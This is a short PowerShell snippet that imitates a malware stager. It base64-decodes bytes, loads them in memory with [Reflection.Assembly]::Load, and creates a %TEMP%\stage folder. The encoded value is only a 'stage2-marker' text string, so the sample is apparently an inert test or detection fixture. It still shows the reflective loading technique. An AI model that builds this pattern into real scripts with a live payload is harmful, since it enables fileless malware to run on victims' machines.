
try { $StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjppMjhwcW12bGZl'); Write-Verbose ("Assembly bytes: " + $StageBytes.Length); [Reflection.Assembly]::Load($StageBytes); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Loader step failed" }
